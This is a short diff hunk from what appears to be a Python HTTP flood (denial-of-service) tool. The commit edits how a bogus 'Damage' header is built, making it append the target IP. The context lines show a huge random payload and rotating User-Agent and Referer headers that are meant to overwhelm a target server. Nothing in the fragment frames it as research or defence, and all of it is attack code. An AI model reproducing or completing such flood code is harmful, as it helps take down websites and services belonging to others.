@@ -39,7 +39,7 @@ def start():
     hh =random._urandom(9999999)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
-    demeg = "Damage: "+random.choice(damage)+str(main_req)+"\r\n"
+    demeg = "Damage: "+random.choice(damage)+str(ip) + "\r\n"
     accept = random.choice(acceptall)
     reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
